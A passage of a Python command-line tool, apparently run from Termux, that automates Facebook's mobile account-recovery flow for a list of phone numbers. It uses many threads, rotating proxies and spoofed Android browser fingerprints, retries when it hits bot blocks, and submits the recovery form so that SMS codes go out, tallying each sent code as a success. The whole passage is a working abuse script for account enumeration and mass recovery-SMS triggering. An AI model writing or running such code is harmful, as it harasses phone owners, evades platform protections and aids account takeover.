    ask_worker = worker_set.get('ask_for_workers', True)
    def_workers = worker_set.get('default_workers', 30)
    
    if ask_worker:
        w_inp = input(f"{GREEN} [{RED}●{GREEN}] Enter number of Threads/Workers ({def_workers} recommended) {EKL} ")
        if w_inp.strip():
            maxworker = int(w_inp)
        else:
            maxworker = int(def_workers)
    else:
        maxworker = int(def_workers)

    clear_logo()
    reset_counters()
    
    sem = threading.Semaphore(maxworker + 10)
    
    try:
        with threadpol(max_workers=maxworker) as executor:
            remaining_numbers = list(numbers)
            
            for num in numbers:
                sem.acquire()
                
                proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                current_proxy = proxy_data['proxy'] if proxy_data else None
                current_locale = proxy_data['locale'] if proxy_data else CURRENT_LOCALE
                
                future = executor.submit(check, num, current_proxy, current_locale, browser_type, 0, server_domain, SMS_PROXY_ITERATOR)
                future.add_done_callback(lambda _: sem.release())
                
                if remaining_numbers:
                    remaining_numbers.pop(0)
                    with open('Number_List.txt', 'w') as f:
                        for n in remaining_numbers:
                            f.write(n + '\n')
    except:
        maxworker = 30

    with print_lock:
        sys.stdout.write('\r                                                                                \r')
        sys.stdout.flush()

    print(''.join([LINE, '\n', GREEN, ' [', RED, '●', GREEN, '] ', WHITE, 'Completed Forgetting ', str(total_checked), ' Numbers.\n', GREEN, ' [', RED, '●', GREEN, '] ', GREEN, 'Total Success: ', str(total_success), ' Numbers.\n', GREEN, ' [', RED, '●', GREEN, '] ', YELLOW, 'Total Failed: ', str(total_failed), ' Numbers.\n', GREEN, ' [', RED, '●', GREEN, '] ', RED, 'Total Error: ', str(total_error), ' Numbers.\n', LINE]))
    
    while True:
        try:
            choice = input(f"{WHITE} Press Enter to Start Again or Type 'M' for Main Menu {EKL} ")
            if choice.lower() in ('m', 'menu'):
                sxr_main()
                return
            break
        except Exception as e:
            print(f"{RED} Error in loop {EKL} {e}")
            input(f"{WHITE} Press Enter to return...")
            sxr_main()
            return

def process_sms(session, resp_text, number, url, base_headers, server_domain, sms_proxy_iterator=None):
    if 'id="contact_point_selector_form"' in resp_text and 'name="recover_method"' in resp_text:
        sms_options = re.findall('input type="radio" name="recover_method" value="(send_sms:.*?)".*?id="(.*?)"', resp_text)
        
        target_value = None
        for val, inp_id in sms_options:
            label_match = re.search('label for="' + re.escape(inp_id) + '".*?<div class="_52jc _52j9">(.*?)</div>', resp_text, re.DOTALL)
            if label_match:
                visible_text = label_match.group(1)
                vis_digits = ''.join(filter(str.isdigit, visible_text))
                
                if number.endswith(vis_digits):
                    target_value = val
                    safe_print(f"{CYAN} SMS Option Found {EKL} {visible_text}")
                    break
                    
        if target_value:
            if sms_proxy_iterator:
                try:
                    proxy_data = next(sms_proxy_iterator)
                    session.proxies.update(proxy_data['proxy'])
                    safe_print(f"{CYAN} Reloading Page...")
                    
                    reload_headers = base_headers.copy()
                    reload_headers.update({
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'referer': url
                    })
                    
                    reload_response = session.get(url, headers=reload_headers)
                    if reload_response.status_code == 200:
                        resp_text = reload_response.text
                    else:
                        safe_print(f"{RED} Page Reload Failed ({reload_response.status_code})")
                except Exception as e:
                    safe_print(f"{RED} Proxy Switch/Reload Error: {e}")
            
            try:
                lsd = re.search('name="lsd" value="(.*?)"', resp_text).group(1) if re.search('name="lsd" value="(.*?)"', resp_text) else ''
                jazoest = re.search('name="jazoest" value="(.*?)"', resp_text).group(1) if re.search('name="jazoest" value="(.*?)"', resp_text) else ''
                
                action_match = re.search('<form.*?action="(.*?)".*?id="contact_point_selector_form"', resp_text, re.DOTALL)
                if action_match:
                    action_url = action_match.group(1).replace('&amp;', '&')
                    full_url = f"https://{server_domain}{action_url}"
                else:
                    full_url = f"https://{server_domain}/ajax/recover/initiate/"
                
                headers = base_headers.copy()
                headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': f"https://{server_domain}",
                    'referer': url
                })
                
                data = {
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'recover_method': target_value,
                    'reset_action': 'Continue'
                }
                
                params = {
                    'c': '/login/',
                    'ctx': 'initate_view',
                    'sr': '0',
                    'ars': 'facebook_login'
                }
                
                sxr_respns = session.post(full_url, headers=headers, data=data, params=params)
                
                if 'action="/recover/code/' in sxr_respns.text:
                    update_counter('success', number, "SMS Sent Successfully", GREEN)
                    return True
                else:
                    update_counter('failed', number, "Code Sent Failed - Skipping...", RED)
                    return True
            except:
                pass
        else:
            update_counter('failed', number, "SMS Option Not Found/Mismatch - Skipping...", YELLOW)
            return True
            
    return False

def check(number, proxy=None, locale='en_US', browser_type='Brave', retry_count=0, server_domain='m.facebook.com', sms_proxy_iterator=None):
    sxr_respns = None
    session = requests.Session()
    
    if proxy:
        session.proxies.update(proxy)
    elif PROXIES:
        session.proxies.update(PROXIES)

    if browser_type == 'Random':
        browser_list = ['Brave', 'Chrome', 'Edge', 'Firefox', 'Samsung', 'Opera', 'UC', 'DuckDuckGo', 'Vivaldi', 'Yandex', 'Kiwi', 'Dolphin', 'Mi Browser', 'Maxthon', 'Puffin']
        current_browser = random.choice(browser_list)
    else:
        current_browser = browser_type

    andro_ver = random.choice(['4.0.3', '4.0.4', '4.1.2', '4.2.2', '4.3', '4.4.2', '4.4.4', '5.0', '5.0.2', '5.1.1', '6.0', '6.0.1', '7.0', '7.1.1'])
    models = ['SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935F', 'SM-J320F', 'SM-J500F', 'SM-J700F', 'SM-A300FU', 'SM-A500FU', 'SM-N910F', 'SM-N920C', 'LG-H815', 'LG-H850', 'LG-D855', 'LG-K420', 'XT1068', 'XT1092', 'XT1562', 'XT1635', 'E6653', 'F5121', 'D6603', 'ALE-L21', 'VNS-L31', 'PRA-LX1']
    model = random.choice(models)
    
    if andro_ver.startswith('4'):
        build_prefix = random.choice(['KOT49', 'KTU84', 'JZO54', 'JSS15'])
    elif andro_ver.startswith('5'):
        build_prefix = random.choice(['LRX21', 'LMY47', 'LRX22'])
    elif andro_ver.startswith('6'):
        build_prefix = random.choice(['MRA58', 'MMB29'])
    elif andro_ver.startswith('7'):
        build_prefix = random.choice(['NRD90', 'NMF26'])
    else:
        build_prefix = 'LMY47'
        
    build = f"{build_prefix}{random.choice('ABCDEFGHJKLMNPQRSTUVWXYZ')}{random.randint(35, 65)}"
    chrome_ver = f"{random.randint(35, 65)}.0.{random.randint(1500, 4000)}.{random.randint(40, 150)}"
    base_ua = f"Mozilla/5.0 (Linux; Android {andro_ver}; {model} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    
    base_headers = {}
    
    if current_browser == 'Brave':
        ua = base_ua
        base_headers = {
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Chrome':
        ua = base_ua
        base_headers = {
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Edge':
        ua = f"{base_ua} EdgA/143.0.0.0"
        base_headers = {
            'sec-ch-ua': '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Firefox':
        rv_ver = random.randint(40, 60)
        ua = f"Mozilla/5.0 (Android {andro_ver}; Mobile; rv:{rv_ver}.0) Gecko/{rv_ver}.0 Firefox/{rv_ver}.0"
    elif current_browser == 'Samsung':
        ua = f"{base_ua} SamsungBrowser/10.0"
        base_headers = {
            'sec-ch-ua': '"Samsung Internet";v="23", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Opera':
        ua = f"{base_ua} OPR/60.0.2254.12345"
        base_headers = {
            'sec-ch-ua': '"Opera";v="80", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'UC':
        ua = f"{base_ua} UBrowser/13.4.0.1306"
        base_headers = {
            'sec-ch-ua': '"UC Browser";v="13", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'DuckDuckGo':
        ua = f"{base_ua} DuckDuckGo/5"
        base_headers = {
            'sec-ch-ua': '"DuckDuckGo";v="5", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Vivaldi':
        ua = f"{base_ua} Vivaldi/6.0"
        base_headers = {
            'sec-ch-ua': '"Vivaldi";v="6", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Yandex':
        ua = f"{base_ua} YaBrowser/23.0"
        base_headers = {
            'sec-ch-ua': '"Yandex";v="23", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Kiwi':
        ua = f"{base_ua} Kiwi/124.0.6367.113"
        base_headers = {
            'sec-ch-ua': '"Kiwi";v="124", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Dolphin':
        ua = f"{base_ua} Dolphin/12.3.0"
        base_headers = {
            'sec-ch-ua': '"Dolphin";v="12", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Mi Browser':
        ua = f"{base_ua} MiuiBrowser/14.0.5"
        base_headers = {
            'sec-ch-ua': '"Mi Browser";v="14", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Maxthon':
        ua = f"{base_ua} Maxthon/7.0.2.1400"
        base_headers = {
            'sec-ch-ua': '"Maxthon";v="7", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    elif current_browser == 'Puffin':
        ua = f"{base_ua} Puffin/9.10.0.51959"
        base_headers = {
            'sec-ch-ua': '"Puffin";v="9", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
    else:
        ua = base_ua
        base_headers = {
            'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }
        
    screen_res = random.choice(['320x480', '480x800', '540x960', '800x480', '854x480', '960x540', '720x1280', '1280x720', '1080x1920', '1920x1080', '1440x2560'])
    session.cookies.update({'m_pixel_ratio': '1', 'wd': screen_res})
    
    base_headers.update({
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': f"{locale},en;q=0.9",
        'priority': 'u=0, i',
        'sec-ch-ua-full-version-list': '"Chromium";v="143.0.0.0", "Not A(Brand";v="24.0.0.0"',
        'sec-ch-ua-model': f'"{model}"',
        'sec-ch-ua-platform-version': f'"{andro_ver}"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua
    })
    
    try:
        first_headers = base_headers.copy()
        first_headers.update({'sec-fetch-site': 'none'})
        
        if retry_count == 0:
            safe_print(f"{LIGHT_GRAY} Searching For {number}...")
            
        git_fb = session.get(f"https://{server_domain}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr", headers=first_headers)
        
        if 'fr' not in session.cookies:
            pass
            
        try:
            lsd = re.search('name="lsd" value="(.*?)"', str(git_fb.text)).group(1)
        except:
            lsd = re.search('\\["LSD",\\[\\],\\{"token":"(.*?)"\\}', str(git_fb.text)).group(1)

        try:
            jazoest = re.search('name="jazoest" value="(.*?)"', str(git_fb.text)).group(1)
        except:
            jazoest = re.search('"initSprinkleValue":"(.*?)"', str(git_fb.text)).group(1)
            
        _data = {
            'lsd': lsd,
            'jazoest': jazoest,
            'email': number,
            'did_submit': 'Search'
        }
        
        post_headers = base_headers.copy()
        post_headers.update({
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': f"https://{server_domain}",
            'referer': f"https://{server_domain}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
        })
        
        url = f"https://{server_domain}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0"
        sxr_respns = session.post(url, data=_data, headers=post_headers, allow_redirects=True)
        
        if 'id="login_identify_search_error_msg"' in sxr_respns.text:
            update_counter('failed', number, "Account Not Found", MAGENTA)
            return
            
        if 'action="/login/identify/?ctx=recover' in sxr_respns.text:
            update_counter('failed', number, "Multiple Account Found - Skipping...", GOLD)
            return

        if sxr_respns.url.startswith(f"https://{server_domain}/login/account_recovery/name_search/"):
            headers = base_headers.copy()
            headers.update({
                'referer': f"https://{server_domain}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"
            })
            sxr_respns = session.get(sxr_respns.url, headers=headers)
            
            safe_print(f"{VIOLET} Clicking Try to another way...")
            
            if 'action="/login/account_recovery/name_search/?flow=initiate_view' in sxr_respns.text:
                headers = base_headers.copy()
                headers.update({'referer': sxr_respns.url})
                sxr_respns = session.get(f"https://{server_domain}/recover/initiate/?c=%2Flogin%2F&fl=initiate_view&ctx=msite_initiate_view", headers=headers)
                
                if process_sms(session, sxr_respns.text, number, sxr_respns.url, base_headers, server_domain, sms_proxy_iterator):
                    return

            if 'name="pass"' in sxr_respns.text and '/login/account_recovery/' in sxr_respns.text:
                update_counter('failed', number, "Only Password Option Found - Skipping...", ORANGE)
                return
            
            update_counter('error', number, "Unknown Page (No Selector) - Skipping...", ORANGE, html_content=sxr_respns.text)
            return

        elif sxr_respns.url.startswith(f"https://{server_domain}/login/device-based/ar/login/?ldata="):
            headers = base_headers.copy()
            headers.update({
                'referer': f"https://{server_domain}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr"
            })
            sxr_respns = session.get(sxr_respns.url, headers=headers)
            
            if 'id="contact_point_selector_form"' in sxr_respns.text:
                try:
                    try_another_way_url = re.search('href="(/recover/initiate/\\?privacy_mutation_token=.*?)"', sxr_respns.text).group(1)
                    try_another_way_url = try_another_way_url.replace('&amp;', '&')
                except:
                    pass

                is_sms_checked = re.search('input type="radio" name="recover_method" value="send_sms:.*?".*?checked="1"', sxr_respns.text)
                if is_sms_checked:
                    if process_sms(session, sxr_respns.text, number, sxr_respns.url, base_headers, 'm.facebook.com', sms_proxy_iterator):
                        return
                    return
                
                headers = base_headers.copy()
                headers.update({'referer': sxr_respns.url})
                sxr_respns = session.get(f"https://{server_domain}{try_another_way_url}", headers=headers)
                
                safe_print(f"{VIOLET} Clicking Try to another way...")
                
                if process_sms(session, sxr_respns.text, number, sxr_respns.url, base_headers, server_domain, sms_proxy_iterator):
                    return
                
                update_counter('error', number, "Unknown Page after try another way - Skipping...", ORANGE, html_content=sxr_respns.text)
                return

            if 'name="captcha_response"' in sxr_respns.text:
                try:
                    match = re.search('src="(https://.*?/captcha/tfbimage\\.php\\?.*?)"', sxr_respns.text)
                    if match:
                        captcha_img = match.group(1).replace('&amp;', '&')
                except:
                    pass
                update_counter('failed', number, "Captcha Found - Skipping...", PURPLE)
                return
            
            if '/help/121104481304395' in sxr_respns.text or '/help/103873106370583' in sxr_respns.text:
                update_counter('failed', number, "Account Disabled - Skipping...", TOXIC)
                return
            
            if 'class="area error"' in sxr_respns.text:
                if retry_count < 3:
                    check(number, proxy, locale, browser_type, retry_count + 1, server_domain, sms_proxy_iterator)
                return

            update_counter('error', number, "Unknown Page (Device Based) - Skipping...", ORANGE, html_content=sxr_respns.text)
            return

        if 'window.MPageLoadClientMetrics' in sxr_respns.text:
             if retry_count < 3:
                check(number, proxy, locale, browser_type, retry_count + 1, server_domain, sms_proxy_iterator)
                return
             update_counter('error', number, "Unknown Page (Bot Block) - Skipping...", RED, html_content=sxr_respns.text)
             return
        
        if '/r.php?next=' in sxr_respns.text or '/login.php?next=' in sxr_respns.text:
            if retry_count < 3:
                check(number, proxy, locale, browser_type, retry_count + 1, server_domain, sms_proxy_iterator)
            return
            
        if "Your Request Couldn't be Processed" in sxr_respns.text:
             update_counter('error', number, "Your Request Couldn't be Processed", RED, html_content=sxr_respns.text)
             return
            
        update_counter('error', number, "Unknown Page - Skipping...", ORANGE, html_content=sxr_respns.text)

    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ChunkedEncodingError) as e:
        safe_print(f"{RED} Network Error {EKL} {e}")
        safe_print(f"{LIGHT_GRAY} Waiting 5 seconds before retrying...")
        time.sleep(5)
        
        err_content = str(e)
        if sxr_respns and hasattr(sxr_respns, 'text'):
            err_content = sxr_respns.text
            
        update_counter('error', f"Network Error: {e}", message=f"Network Error: {e}", html_content=err_content)

    except Exception as e:
        if retry_count < 3:
            check(number, proxy, locale, browser_type, retry_count + 1, server_domain, sms_proxy_iterator)
            return
            
        err_content = str(e)
        if sxr_respns and hasattr(sxr_respns, 'text'):
            err_content = sxr_respns.text
            
        update_counter('error', number, f"Unexpected Error: {e}", RED, html_content=err_content)

def sxr_secure_start():
    global user_nm, expr
    user_nm = "Termux User"
    expr = "Lifetime"
    sxr_main()

if __name__ == '__main__':
    sxr_secure_start()